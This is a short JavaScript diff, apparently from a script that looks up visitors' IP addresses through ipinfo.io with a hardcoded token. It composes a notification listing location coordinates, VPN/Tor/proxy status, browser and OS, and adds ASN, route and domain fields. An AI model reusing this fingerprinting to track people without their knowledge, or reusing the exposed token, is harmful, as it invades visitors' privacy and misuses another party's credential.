@@ -114,6 +114,9 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
   let isProxy = data.privacy && data.privacy.proxy ? true : false;
   let isVPN = data.privacy && data.privacy.vpn ? true : false;
   let isTOR = data.privacy && data.privacy.tor ? true : false;
+  let isAsn = data.asn && data.asn.asn ? true : false;
+  let isRoute = data.asn && data.asn.route ? true : false;
+  let isDomain = data.asn && data.asn.domain ? true : false;
         
         const message = `
       * Ip 🌐*
@@ -127,6 +130,9 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ Vpn: ${isVPN}*
     *├ Tor: ${isTOR}*
     *├ Coordinates: ${longitude} ${latitude},*
+    *├ Asn: ${isAsn}*
+    *├ Route: ${isRoute}*
+    *├ Domain: ${isDomain}*
       * System 🖥*
     *├ Browser: ${browser}*
     *├ Os: ${osname}*
